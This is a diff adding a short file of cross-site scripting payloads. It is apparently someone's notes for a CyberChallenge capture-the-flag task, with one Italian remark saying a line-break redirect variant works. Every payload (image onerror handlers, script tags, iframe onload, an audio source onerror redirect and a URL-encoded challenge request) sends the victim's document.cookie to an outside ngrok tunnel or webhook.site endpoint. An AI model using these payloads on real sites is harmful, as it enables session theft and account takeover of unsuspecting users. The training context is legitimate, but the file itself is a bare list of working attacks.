@@ -1,0 +1,33 @@
+image = new Image(); image.src='https://8955-2-46-33-158.ngrok.io/?+document.cookie;
+
+
+
+ciao" onerror= "image = new Image(); image.src='https://8955-2-46-33-158.ngrok.io?'+document.cookie;"
+
+
+
+<script>
+   image = new Image();
+   image.src='https://5681-2-46-47-226.ngrok.io?'+document.cookie;
+</script>
+
+
+
+<iframe src="https://www.google.com" onload="image = new Image(); image.src='https://5681-2-46-47-226.ngrok.io?'+document.cookie;" title="google site"></iframe>
+
+
+<iframe src='https://webhook.site/db2bb833-2a34-479c-bf9e-ced89e3d56d0?'+document.cookie' ></iframe>
+
+
+
+ <source src="horse.ogg" onerror="window.location.replace('https://webhook.site/db2bb833-2a34-479c-bf9e-ced89e3d56d0?'+document.cookie');" type="audio/ogg">
+ 
+ 
+ 
+<script> image = new Image(); image.src='https://8e28-2-46-33-158.ngrok.io?'+document.cookie; </script>
+
+
+FUNZIONA VA A CAPO E FA LA REDIRECT
+http://xss5.challs.cyberchallenge.it/?html=%0Awindow.location.href%20=%20`https://2c9f-2-46-47-226.ngrok.io\?` %2B document.cookie//
+
+
